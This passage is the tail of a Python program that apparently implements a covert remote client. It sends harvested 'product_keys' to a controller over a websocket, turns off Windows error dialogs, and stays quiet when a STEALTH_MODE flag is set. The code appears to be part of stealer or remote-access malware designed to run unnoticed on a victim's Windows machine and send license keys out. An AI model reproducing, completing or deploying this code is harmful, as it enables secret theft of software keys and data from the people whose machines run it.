            pass

        await self.websocket.send(json.dumps({
            "type": "product_keys",
            "keys": keys
        }))


if __name__ == "__main__":
    # Set Windows error mode to prevent error dialogs
    if sys.platform == "win32":
        try:
            import ctypes

            SEM_NOGPFAULTERRORBOX = 0x0002
            ctypes.windll.kernel32.SetErrorMode(SEM_NOGPFAULTERRORBOX)
        except:
            pass

    try:
        client = SilentClient()
        while client.running:
            time.sleep(1)
    except Exception as e:
        if not STEALTH_MODE:
            print(f"[!] Fatal error: {e}")
            if hasattr(sys, "frozen"):
                # If running as compiled exe, keep window open on error
                input("Press Enter to exit...")
